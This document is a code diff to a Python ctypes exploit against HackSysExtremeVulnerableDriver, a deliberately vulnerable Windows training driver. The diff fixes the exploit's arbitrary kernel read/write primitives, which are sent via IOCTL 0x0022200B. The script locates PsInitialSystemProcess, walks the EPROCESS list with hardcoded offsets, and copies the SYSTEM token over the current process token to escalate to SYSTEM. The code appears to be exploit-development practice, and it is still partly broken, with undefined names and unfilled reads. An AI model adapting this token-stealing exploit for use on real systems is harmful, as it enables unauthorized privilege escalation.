@@ -82,7 +82,7 @@ if dwStatus != STATUS_SUCCESS:
 
 
 ########################################## KERNEL BASE ################################################
-def getkernelBase(driver, what=None, where=None):
+def getkernelBase(driver):
     print '[*] Calling NtQuerySystemInformation w/SystemModuleInformation'
     sys_info = create_string_buffer(0)
     sys_info_len = c_ulong(0)
@@ -149,15 +149,15 @@ def get_PsISP_kernel_address(kernel_base):
     debug_print("[+] PsInitialSystemProcess Userland Base Address: 0x%X" % PsISP_user_address)
     
     # Calculate PsInitialSystemProcess offset in kernel land
-    system_kernel_base_pointer = kernel_image_base + ( PsISP_user_address - hKernelImage)
+    system_process_base_pointer = kernel_image_base + ( PsISP_user_address - hKernelImage)
     debug_print("[+] PsInitialSystemProcess Kernel Base Address: 0x%X" % PsISP_kernel_address_ptr)
     
     PsISP_kernel_address = c_ulonglong()
     
-    return system_kernel_base_pointer
+    return system_process_base_pointer
 
 ################################################### WRITE ###########################################################
-def writePrimitive(driver, what_addr=None, where=None):
+def writePrimitive(driver, what_addr, where):
     
     IoControlCode = 0x0022200B
     InputBuffer = c_void_p(0x000000001a000000)
@@ -203,8 +203,8 @@ def writePrimitive(driver, what_addr=None, where=None):
             POINTER(c_ulonglong))[0]
     return triggerIOCTL
 ################################################### READ ###########################################################
-                                 #What is it you want to write? #We are writing it back to userland memory.
-def readPrimitive(driver, what_addr=None, user_addr):
+                          #What is it you want to read? #We are writing it back to userland memory.
+def readPrimitive(driver, what_addr, where):
 
     #We've created a block of memory at the top of userland via dwStatus
     IoControlCode = 0x0022200B
@@ -215,7 +215,7 @@ def readPrimitive(driver, what_addr=None, user_addr):
     dwBytesReturned = c_ulong()
     lpBytesReturned = byref(dwBytesReturned)
                                                             #THIS SHOULD BE USER_ADDR, OUR USER MEMORY PAGE
-    data = struct.pack('<Q', what_addr) + struct.pack('<Q', where=None)
+    data = struct.pack('<Q', what_addr) + struct.pack('<Q', where)
     dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
             0x000000001a000000, data, len(data), byref(written))
 
@@ -245,36 +245,40 @@ unique_process_id_offset = 0x2e0
 active_process_links_offset = 0x2e8
 token_offset = 0x358
     
-def get_current_eprocess(system_kernel_base_pointer):
+def get_current_eprocess(system_process_base_pointer):
     """ Returns ptr to Current EPROCESS structure """
     flink = c_ulonglong()
-    readPrimitive(driver, system_kernel_base_pointer + active_process_links_offset, user_addr);    
+    readPrimitive(driver, system_process_base_pointer + active_process_links_offset, user_addr);    
     
     current_pEPROCESS = 0
     while (1):
         unique_process_id = c_ulonglong(0)
         
         # Adjust EPROCESS pointer for next entry
-        system_kernel_base_pointer = flink.value - unique_process_id_offset - 0x8
+        system_process_base_pointer = flink.value - unique_process_id_offset - 0x8
         
         # Get PID
-        readPrimitive(driver, system_kernel_base_pointer + unique_process_id_offset, user_addr);   
+        readPrimitive(driver, system_process_base_pointer + unique_process_id_offset, user_addr);   
         
         # Check if we're in the current process
         if (os.getpid() == unique_process_id.value):
-            current_pEPROCESS = system_kernel_base_pointer
+            current_pEPROCESS = system_process_base_pointer
             break
             
-        readPrimitive(driver, system_kernel_base_pointer + active_process_links_offset, user_addr);    
+        readPrimitive(driver, system_process_base_pointer + active_process_links_offset, user_addr);    
         
         # If next same as last, we've reached the end
-        if (system_kernel_base_pointer == flink.value - unique_process_id_offset - 0x8):
+        if (system_process_base_pointer == flink.value - unique_process_id_offset - 0x8):
             break
         
     return currentprocessBase 
 
 ########################################### MAIN ###############################################
 def executeOverwrite():
+    
+    #This is a fixed address in our userland memory page.
+    user_addr = 0x000000001a000000
+
     driver = kernel32.CreateFileA(
         '\\\\.\\HackSysExtremeVulnerableDriver',
         GENERIC_READ | GENERIC_WRITE,
@@ -293,19 +297,18 @@ def executeOverwrite():
         #Get kernel base.
         img_name, kernel_base = getkernelBase(driver)
         #Get system process base.
-        system_kernel_base_pointer = get_PsISP_kernel_address(kernel_base)
+        system_process_base_pointer = get_PsISP_kernel_address(kernel_base)
         #Read the value of that token.
-        read_value = readPrimitive(driver, system_kernel_base_pointer)
+        read_value = readPrimitive(driver, system_process_base_pointer, user_addr)
         #Walk the process list for wherever our process is in memory.
-        currentprocessBase = get_current_eprocess(system_kernel_base_pointer)
+        currentprocessBase = get_current_eprocess(system_process_base_pointer)
 
         #Define our expected offsets for this version of Windows.
-        system_token = system_kernel_base_pointer + 0x358
-        user_addr = 0x000000001a000000
+        system_token = system_process_base_pointer + 0x358
         current_token = currentprocessBase + 0x358
 
         #Write the system_token over our current_token for SYSTEM privileges.
-        writePrimitive(system_token, current_token)
+        success = writePrimitive(driver, system_token, current_token)
 
 ############################################ RUN ################################################
 
